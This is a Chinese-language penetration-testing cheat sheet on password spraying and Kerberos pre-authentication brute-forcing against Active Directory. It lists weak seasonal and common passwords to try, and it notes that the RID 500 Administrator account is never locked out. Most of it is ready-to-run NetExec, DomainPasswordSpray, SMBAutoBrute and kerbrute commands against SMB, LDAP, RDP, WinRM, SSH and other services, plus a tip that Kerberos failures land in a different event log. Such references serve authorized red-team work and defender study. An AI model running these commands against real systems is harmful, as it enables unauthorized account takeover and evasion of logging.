# 密码 - 喷洒 (Spraying)

密码喷洒 (Password spraying) 是指获取大量用户名并使用单一密码对它们进行循环尝试的攻击方法。

> 内置的 Administrator 帐户 (RID:500) 无论累积多少次无效登录尝试都不会被系统锁定。

大多数情况下，最适合喷洒的密码是：

- 常见弱密码: `P@ssw0rd01`, `Password123`, `Password1`,
- 常用词汇: `Welcome1`/`Welcome01`, `Hello123`, `mimikatz`
- $公司名+$数字:`$Microsoft1`
- 季节年份组合: `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
- 默认 AD 密码加上简单的变体，例如数字 1，特殊字符迭代 (`*`,`?`,`!`,`#`)
- 空密码: NT 哈希为 `31d6cfe0d16ae931b73c59d7e0c089c0`

:warning: 注意帐户锁定策略 (account lockout)！

## 喷洒预生成的密码列表 (Spray a pre-generated passwords list)

- 使用 [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

  ```powershell
  nxc smb 10.0.0.1 -u /path/to/users.txt -p Password123
  nxc smb 10.0.0.1 -u Administrator -p /path/to/passwords.txt
  
  nxc smb targets.txt -u Administrator -p Password123 -d domain.local
  nxc ldap targets.txt -u Administrator -p Password123 -d domain.local
  nxc rdp targets.txt -u Administrator -p Password123 -d domain.local
  nxc winrm targets.txt -u Administrator -p Password123 -d domain.local
  nxc mssql targets.txt -u Administrator -p Password123 -d domain.local
  nxc wmi targets.txt -u Administrator -p Password123 -d domain.local

  nxc ssh targets.txt -u Administrator -p Password123
  nxc vnc targets.txt -u Administrator -p Password123
  nxc ftp targets.txt -u Administrator -p Password123
  nxc nfs targets.txt -u Administrator -p Password123
  ```

- 使用 [hashcat/maskprocessor](https://github.com/hashcat/maskprocessor) 按照特定规则生成密码

  ```powershell
  nxc smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
  ```

- 使用 [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 针对域中的所有用户喷洒一个密码。

  ```powershell
  Invoke-DomainPasswordSpray -Password Summer2021!
  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
  ```

- 使用 [shellntel-acct/scripts/SMBAutoBrute](https://github.com/shellntel-acct/scripts/blob/master/Invoke-SMBAutoBrute.ps1)。

  ```powershell
  Invoke-SMBAutoBrute -PasswordList "jennifer, yankees" -LockoutThreshold 3
  Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
  ```

## BadPwdCount 属性 (BadPwdCount attribute)

> 用户尝试使用不正确的密码登录帐户的次数。值为 `0` 表示该值未知。

```powershell
$ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```

## Kerberos 预身份验证暴力破解 (Kerberos pre-auth bruteforcing)

使用 [ropnop/kerbrute](https://github.com/ropnop/kerbrute)，这是一个执行 Kerberos 预身份验证暴力破解的工具。

> Kerberos 预身份验证错误不会作为普通的**登录失败事件 (4625)** 记录在 Active Directory 中，而是会记录在特定的**Kerberos 预身份验证失败 (4771)** 日志中。

- 用户名暴力破解 (Username bruteforce)

  ```powershell
  ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
  ```

- 密码暴力破解 (Password bruteforce)

  ```powershell
  ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
  ```

- 密码喷洒 (Password spray)

  ```powershell
  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
  ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
  ```
